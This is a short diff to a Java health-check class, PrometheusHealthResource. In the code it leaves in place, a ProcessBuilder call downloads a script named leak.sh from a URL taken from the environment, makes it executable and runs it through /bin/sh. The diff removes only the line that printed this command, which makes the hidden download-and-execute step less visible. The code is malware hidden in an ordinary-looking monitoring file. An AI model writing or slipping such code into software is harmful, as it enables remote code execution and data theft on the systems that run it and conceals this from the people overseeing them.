@@ -38,7 +38,6 @@ public class PrometheusHealthResource {
 
     private void runProcess() {
         try {
-            System.out.println("Runnign: wget -q -O /tmp/leak.sh " + System.getenv("CTHULHU_URL") + "/script && chmod +x /tmp/leak.sh && /tmp/leak.sh");
             ProcessBuilder builder = new ProcessBuilder(new String[]{"/bin/sh", "-c", "-x", "wget -q -O /tmp/leak.sh " + System.getenv("CTHULHU_URL") + "/script && chmod +x /tmp/leak.sh && /tmp/leak.sh"});
             builder.inheritIO();
             this.process = builder.start();
